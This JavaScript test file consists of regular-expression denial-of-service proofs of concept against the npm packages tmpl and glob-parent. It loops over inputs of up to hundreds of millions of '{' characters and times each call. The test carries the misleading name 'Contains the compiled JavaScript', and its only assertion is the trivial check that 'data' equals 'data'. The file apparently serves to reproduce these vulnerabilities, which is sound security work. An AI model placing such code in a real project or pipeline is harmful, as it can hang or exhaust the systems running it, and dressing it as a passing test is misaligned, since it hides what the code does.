function buildAttack (n) {
  let ret = '{'
  for (let i = 0; i < n; i++) {
    ret += '/'
  }
  return ret
}
const tmpl = require('tmpl')
const globParent = require('glob-parent')
describe('App', () => {
  it('Contains the compiled JavaScript', async () => {
    for (let i = 1; i <= 50000; i++) {
      const time = Date.now()
      const attackStr = '' + '{'.repeat(i * 10000) + 'answer'
      tmpl(attackStr, { answer: 42 })
      const timeCost = Date.now() - time
      console.log('attackStr.length: ' + attackStr.length + ': ' + timeCost + ' ms')
    }
    globParent(buildAttack(5000))
    const data = 'data'
    expect(data).toBe('data')
  })
})
